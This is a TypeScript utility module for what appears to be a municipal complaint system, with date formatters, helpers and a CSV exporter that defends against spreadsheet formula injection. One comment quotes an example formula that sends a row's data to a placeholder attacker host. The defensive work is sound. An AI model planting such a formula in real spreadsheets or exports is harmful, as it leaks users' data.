const DATE = new Intl.DateTimeFormat("en-GB", {
  day: "2-digit",
  month: "short",
  year: "numeric",
});

const DATE_TIME = new Intl.DateTimeFormat("en-GB", {
  day: "2-digit",
  month: "short",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
});

export function formatDate(iso: string | null | undefined): string {
  if (!iso) return "—";
  const date = new Date(iso);
  return Number.isNaN(date.getTime()) ? "—" : DATE.format(date);
}

export function formatDateTime(iso: string | null | undefined): string {
  if (!iso) return "—";
  const date = new Date(iso);
  return Number.isNaN(date.getTime()) ? "—" : DATE_TIME.format(date);
}

/** `2026-08-04`, the value shape an `<input type="date">` expects. */
export function toDateInputValue(iso: string | null | undefined): string {
  if (!iso) return "";
  const date = new Date(iso);
  return Number.isNaN(date.getTime()) ? "" : date.toISOString().slice(0, 10);
}

const RELATIVE = new Intl.RelativeTimeFormat("en", { numeric: "auto" });

const UNITS: Array<[Intl.RelativeTimeFormatUnit, number]> = [
  ["year", 31_536_000_000],
  ["month", 2_592_000_000],
  ["day", 86_400_000],
  ["hour", 3_600_000],
  ["minute", 60_000],
];

export function formatRelative(iso: string | null | undefined): string {
  if (!iso) return "—";
  const time = new Date(iso).getTime();
  if (Number.isNaN(time)) return "—";

  const diff = time - Date.now();
  const magnitude = Math.abs(diff);

  for (const [unit, ms] of UNITS) {
    if (magnitude >= ms) return RELATIVE.format(Math.round(diff / ms), unit);
  }
  return "just now";
}

export function initials(name: string): string {
  return name
    .split(" ")
    .filter(Boolean)
    .map((part) => part[0])
    .slice(0, 2)
    .join("")
    .toUpperCase();
}

export function pluralize(count: number, singular: string, plural = `${singular}s`): string {
  return `${count.toLocaleString()} ${count === 1 ? singular : plural}`;
}

/**
 * Neutralises spreadsheet formula injection.
 *
 * RFC 4180 quoting alone does not help here: Excel, LibreOffice and Sheets
 * all evaluate a cell whose *content* begins with `=`, `+`, `@` (or a control
 * character that a leading formula can hide behind), and quoting is stripped
 * before that decision is made. Since most of these columns are free text a
 * citizen typed into the municipal website — `Description`, `Citizen`,
 * `Location` — the person filling in the complaint form would otherwise get
 * to choose what runs on a staff member's machine when they hit Export.
 * `=HYPERLINK("http://attacker/"&A1,"click")` quietly exfiltrates the row.
 *
 * Prefixing a single quote is the standard mitigation: spreadsheet software
 * reads it as "this cell is text" and does not display it. A leading `-` is
 * left alone — it is ordinary in prose ("- broken since Monday") and does not
 * evaluate on its own.
 */
function neutralizeFormula(text: string): string {
  return /^[=+@\t\r]/.test(text) ? `'${text}` : text;
}

/** RFC 4180 escaping — quotes doubled, fields containing separators quoted. */
export function toCsv(rows: Array<Record<string, string | number | null>>): string {
  if (!rows.length) return "";
  const headers = Object.keys(rows[0]);

  const escape = (value: string | number | null): string => {
    const text = neutralizeFormula(
      value === null || value === undefined ? "" : String(value)
    );
    return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
  };

  return [
    headers.join(","),
    ...rows.map((row) => headers.map((header) => escape(row[header])).join(",")),
  ].join("\r\n");
}
